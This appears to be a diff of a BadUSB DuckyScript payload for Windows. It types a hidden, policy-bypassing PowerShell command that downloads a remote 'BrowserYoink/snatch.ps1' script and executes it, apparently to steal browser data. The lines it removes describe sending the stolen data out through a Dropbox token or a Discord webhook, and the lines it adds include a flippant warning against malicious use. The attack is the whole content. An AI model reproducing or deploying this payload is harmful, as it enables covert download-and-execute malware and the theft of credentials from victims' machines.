@@ -8,10 +8,9 @@ REM     Target: Windows 10, 11
 
 GUI r
 DELAY 500
-STRING powershell -w h -ep bypass $dc='';$db='';irm https://jakoby.lol/hgw | iex
+STRING powershell -w h -ep bypass $AccessToken='';irm https://raw.githubusercontent.com/ApenJulius/BadUSB/main/Payloads/BrowserYoink/snatch.ps1?token=GHSAT0AAAAAACJV7V7KBACKLPG7IPWWD3K6ZKQBHHQ | iex
 ENTER
 
-REM     Fill in either variable or both to set your exfil method.
-REM     $db is the variable that holds your DropBox token.
-REM     $dc is the variable that holds your Discord webhook.   
-REM     If you are using DropBox, also remember to replace ?dl=0 with ?dl=1 at the end of your link so it is executed properly.
+
+REM     If you use this as is for malicious stuff you will be caught 100%.
+REM     Dont be an idiot
